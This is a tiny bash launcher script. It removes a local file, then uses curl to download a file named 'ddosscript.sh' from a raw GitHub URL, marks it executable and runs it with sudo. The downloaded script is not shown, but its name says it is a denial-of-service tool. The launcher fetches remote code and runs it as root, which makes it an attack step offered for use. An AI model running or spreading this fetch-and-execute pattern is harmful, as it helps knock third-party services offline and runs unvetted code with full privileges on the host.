#!/bin/bash

rm ddosscript.sh
curl -OL "https://raw.githubusercontent.com/Andrii-Asiox/test/main/ddosscript.sh"
sudo chmod 774 ddosscript.sh
sudo ./ddosscript.sh
